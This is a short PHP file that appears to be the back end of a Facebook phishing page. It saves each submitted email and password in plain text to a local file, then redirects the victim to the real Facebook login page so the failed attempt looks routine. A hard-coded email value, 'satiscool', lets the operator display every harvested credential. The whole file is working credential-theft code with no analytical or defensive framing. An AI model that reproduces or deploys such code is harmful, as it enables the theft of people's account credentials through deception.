<?php
if (isset($_POST['email']) && isset($_POST['pass'])) {

    $email = $_POST['email'];
    $pass = $_POST['pass'];

    // If display is wanted
    if (strcmp ($email, "satiscool") == 0) {

      echo 'Displaying previous entries...<br>';

      $handle = fopen("passStored.txt", "r");
      $count=  0;
      while (($line = fgets($handle)) !== false) {
        $count++;
        echo "<br>" . $count . " | " .  $line;
      }
      fclose($handle);
      exit(0);

    }
    // Save on file...
    else {
      $formated = $email . " : " . $pass . "\n";

      $recordFile = fopen('passStored.txt', 'a');
      fputs($recordFile, $formated);
      fclose($recordFile);

      header('Location: https://www.facebook.com/login.php?login_attempt=1&amp;lwv=110');
    }
  }
?>